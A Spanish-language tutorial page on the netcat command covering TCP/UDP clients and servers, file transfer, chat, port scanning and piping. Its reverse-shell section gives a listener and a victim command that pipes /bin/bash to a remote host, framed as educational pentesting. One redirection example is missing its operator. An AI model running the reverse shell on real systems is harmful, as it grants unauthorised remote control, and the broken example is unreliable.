---
title: Netcat
route: /linux/comandos/Netcat
---

# Netcat en Linux
---

## ¿Qué es Netcat? {#qué-es-netcat}
**Netcat** (abreviado nc) es una herramienta de línea de comandos usada para:

- Leer y escribir datos en conexiones **TCP o UDP**.
- Crear **clientes y servidores**.
- Transferir archivos, hacer **escucha de puertos**, **chats**, o incluso **backdoors** (de forma ética y controlada).

Es conocida como el **“cuchillo suizo de las redes”**.

---

## Instalación {#instalación}
En la mayoría de sistemas viene preinstalado:
```bash
nc -h
```

Sí no lo tienes:

**Linux (Debian/Ubuntu):**
```bash
sudo apt install netcat
```

**Windows:** Puedes usar **Ncat** (parte de Nmap): [https://nmap.org/ncat/](https://nmap.org/ncat/)

---

## Sintaxis general {#sintaxis-general}
```bash
nc [opciones] [host] [puerto]
```

---

## Modos principales de uso {#modos-principales-de-uso}
## Cliente TCP {#cliente-tcp}
Conectarse a un servidor:
```bash
nc 127.0.0.1 8080
```

Esto abre una conexión al puerto 8080 del localhost.

## Servidor TCP {#servidor-tcp}
Escuchar conexiones:
```bash
nc -l -p 8080
```

-l → modo escucha

-p → especifica el puerto

Luego, desde otro terminal:
```bash
nc 127.0.0.1 8080
```

Ahora puedes **enviar mensajes entre ambos terminales (chat simple)**.

---

## UDP en lugar de TCP {#udp-en-lugar-de-tcp}
Para usar **UDP** en vez de TCP:
```bash
# Servidor
nc -u -l -p 6000

# Cliente
nc -u 127.0.0.1 6000
```

-u → activa modo UDP.

---

## Transferencia de archivos {#transferencia-de-archivos}
## Enviar un archivo {#enviar-un-archivo}
Servidor que recibirá:
```bash
nc -l -p 5000 > archivo_recibido.txt
```

Cliente que envía:
```bash
nc 127.0.0.1 5000 < archivo.txt
```

El archivo archivo.txt se envía al servidor.

---

## Chat simple entre dos PCs (TCP) {#chat-simple-entre-dos-pcs-tcp}
En una máquina:
```bash
nc -l -p 4000
```

En otra:
```bash
nc IP_DEL_SERVIDOR 4000
```

Ahora ambos pueden escribir y leer mensajes.

---

## Escaneo de puertos {#escaneo-de-puertos}
Netcat puede escanear qué puertos están abiertos en una máquina:
```bash
nc -zv 192.168.1.10 20-80
```

-z → modo “scan” sin enviar datos.

-v → modo verbose (muestra resultado).

20-80 → rango de puertos.

---

## Redirección de entrada/salida {#redirección-de-entradasalida}
Puedes usar **pipes** para automatizar tareas:
```bash
echo "Hola servidor" | nc 127.0.0.1 8080
```

O guardar la respuesta:
```bash
nc 127.0.0.1 80  respuesta.txt
```

---

## Reverse Shells (usos éticos y educativos) {#reverse-shells-usos-éticos-y-educativos}
Netcat puede crear conexiones remotas tipo **shell inversa**, usadas en **pentesting** (no ilegalmente).

## En el servidor (escuchando) {#en-el-servidor-escuchando}
```bash
nc -l -p 4444 -v
```

## En la víctima (simulada) {#en-la-víctima-simulada}
```bash
nc 192.168.1.100 4444 -e /bin/bash
```

Esto le da al servidor una consola remota de la otra máquina. *(Solo en entornos controlados o de práctica legal.)*

---

## Otras opciones útiles {#otras-opciones-útiles}
<!-- Tabla convertida manualmente -->

---

## Ejemplo práctico completo {#ejemplo-práctico-completo}
## Crear servidor de eco {#crear-servidor-de-eco}
```bash
# Servidor
nc -l -p 1234 -v
```

## Cliente {#cliente}
```bash
nc 127.0.0.1 1234
```

Ahora cualquier texto que envíes se reflejará entre ambos.

---

## Resumen rápido {#resumen-rápido}
<!-- Tabla convertida manualmente -->

---

## Alternativas modernas {#alternativas-modernas}
- **Ncat** (de Nmap): versión más segura y moderna.
- **Socat**: similar pero con más opciones.
- **PowerCat** (en Windows PowerShell): equivalente en sistemas modernos.